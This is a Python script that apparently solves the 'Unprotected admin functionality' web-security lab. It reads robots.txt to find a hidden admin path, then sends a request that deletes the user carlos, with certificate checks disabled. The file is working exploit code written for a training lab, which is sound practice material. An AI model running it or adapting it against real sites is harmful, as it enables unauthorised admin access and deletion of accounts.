import requests
import urllib3
import re
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Unprotected admin functionality"


def run(url, payload, proxies=None):
    url = url.rstrip('/')

    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Fetch the robots.txt file\n2. Extract the admin panel hidden path\n3. Delete carlos from the admin panel\n""")

    print(Fore.WHITE + "[1] Fetching the robots.txt file")

    robots_txt = requests.get(
        f"{url}/robots.txt", verify=False, allow_redirects=False, proxies=proxies)

    print(Fore.WHITE + "[2] Extracting the hidden path")
    hidden_path = re.findall("Disallow: (.*)", robots_txt.text)[0]
    print(Fore.GREEN + "hidden path" + Fore.WHITE +
          " => " + Fore.YELLOW + hidden_path)

    print(Fore.WHITE + "[3] Deleting carlos")

    try:
        r = requests.get(
            f"{url}{hidden_path}/delete?username=carlos", verify=False, allow_redirects=False, proxies=proxies)
        return True

    except Exception as e:
        print(f"[!] Failed to fetch payload through exception")
        return False
